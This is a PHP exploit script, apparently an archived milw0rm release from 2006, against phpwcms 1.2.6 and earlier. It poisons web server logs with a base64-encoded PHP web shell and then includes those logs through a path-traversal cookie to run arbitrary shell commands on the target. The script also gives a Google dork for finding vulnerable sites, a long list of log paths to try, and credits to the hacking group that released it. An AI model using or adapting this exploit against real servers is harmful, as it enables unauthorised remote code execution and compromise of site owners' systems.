<?

print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 

[Exploit name: phpwcms <= 1.2.6 (Cookie: wcs_user_lang) Local File Include Exploit
[Script name: phpwcms v.1.2.6
[Script site: http://sourceforge.net/projects/phpwcms
dork: inurl:"phpwcms/index.php?id="




Find by: Kacper (a.k.a Rahim)


========>  DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam  <========
========>         http://www.rahim.webd.pl/            <========

Contact: kacper1964@yahoo.pl

(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon 
TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein
Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios, 
mIvus, nukedclx, SkD, wacky, xoron
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                Greetings for 4ll Fusi0n Group members ;-)
                and all members of hacker.com.pl ;)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
';


/*
works with register_globals=On

in login.php line 45-63:
....
if(isset($_POST['form_lang'])) {
	$_SESSION["wcs_user_lang"] = strtolower(substr(clean_slweg($_POST['form_lang']), 0, 2));
}
if(!isset($_SESSION["wcs_user_lang"])) {                   //<-----------{1}
	if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
		$_SESSION["wcs_user_lang"] = strtolower( substr( $_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2 ) );
	} else {
		$_SESSION["wcs_user_lang"] = strtolower($phpwcms["default_lang"]);
	}
}
if(isset($BL[strtoupper($_SESSION["wcs_user_lang"])]) && file_exists('include/inc_lang/backend/'.$_SESSION["wcs_user_lang"].'/lang.inc.php')) {
	$lang_file_include = 'include/inc_lang/backend/'.$_SESSION["wcs_user_lang"].'/lang.inc.php';  //<-----------{2}
	$_SESSION["wcs_user_lang_custom"] = 1;
} else {
	$lang_file_include = 'include/inc_lang/backend/en/lang.inc.php';
	$_SESSION["wcs_user_lang"] 			= "en"; //by ono
	$_SESSION["wcs_user_lang_custom"] 	= 0;
}
require_once ($lang_file_include);        //<-----------{3}
....
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

by Kacper ;)
*/


if ($argc<4) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path cmd OPTIONS
host:      target server (ip/hostname)
path:      phpwcms path
cmd:       a shell command (ls -la)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 2.2.2.2 /phpwcms/ ls -la -P1.1.1.1:80
php '.$argv[0].' 1.1.1.1 / ls -la
-----------------------------------------------------------------------------
');

die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function wyslij_pakiety($pakiet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$pakiet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";

$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}


echo "[1] insert evil code in logfiles ...\r\n\r\n";
$hauru = base64_decode("PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuLi5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyBUbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2VjaG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvIjtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYXNzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+");
$pakiet="GET ".$p.$hauru." HTTP/1.0\r\n";
$pakiet.="User-Agent: ".$hauru." Googlebot/2.1\r\n";
$pakiet.="Host: ".$host."\r\n";
$pakiet.="Connection: close\r\n\r\n";
wyslij_pakiety($pakiet);
sleep(3);

$paths= array (
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../../../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

for ($i=0; $i<=count($paths)-1; $i++)
{
$a=$i+2;
echo "[2] [".$a."] Check Path: ".$paths[$i]."\r\n";
echo "[3] remote code execution...wait..\n";
$pakiet ="GET ".$p."login.php HTTP/1.1\r\n";
$pakiet.="Cookie: wcs_user_lang=../../../".$paths[$i]."%00;\r\n";
$pakiet.="HAURU: ".$cmd."\r\n";
$pakiet.="Host: ".$host."\r\n";
$pakiet.="Connection: Close\r\n\r\n";
wyslij_pakiety($pakiet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}
}
echo "Exploit err0r :(\r\n";
echo "Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n";
?>

# milw0rm.com [2006-11-11]
